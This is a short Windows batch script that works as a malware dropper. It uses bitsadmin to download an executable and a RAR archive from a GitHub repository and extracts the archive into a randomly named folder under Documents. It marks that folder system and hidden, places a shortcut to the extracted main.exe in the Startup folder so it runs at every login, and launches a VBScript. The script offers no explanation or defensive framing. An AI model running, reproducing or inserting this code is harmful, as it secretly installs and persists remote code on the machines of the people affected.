echo
set /a num=%random% %%10000 +1
bitsadmin /transfer zip /priority high https://github.com/batutamesmo/cc/raw/main/xxmklink.exe %temp%\xxmklink.exe
bitsadmin /transfer zip /priority high https://github.com/batutamesmo/cc/raw/main/a.rar %temp%\%num%.rar

IF EXIST "%ProgramFiles(x86)%\WinRAR\Rar.exe" (
    "%ProgramFiles(x86)%\WinRAR\Rar.exe" x -c -y  "%temp%\%num%.rar" "%USERPROFILE%\Documents\%num%\"
) ELSE (
    "%ProgramFiles%\WinRAR\Rar.exe" x -c -y  "%temp%\%num%.rar" "%USERPROFILE%\Documents\%num%\"
)
attrib +s +h "%USERPROFILE%\Documents\%num%"
cd "%temp%"
xxmklink "%USERPROFILE%\Desktop\main"   "%USERPROFILE%\Documents\%num%\main.exe"
CD "%USERPROFILE%\Documents\%num%\"
move "%USERPROFILE%\Desktop\main.lnk" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"


start s.vbs

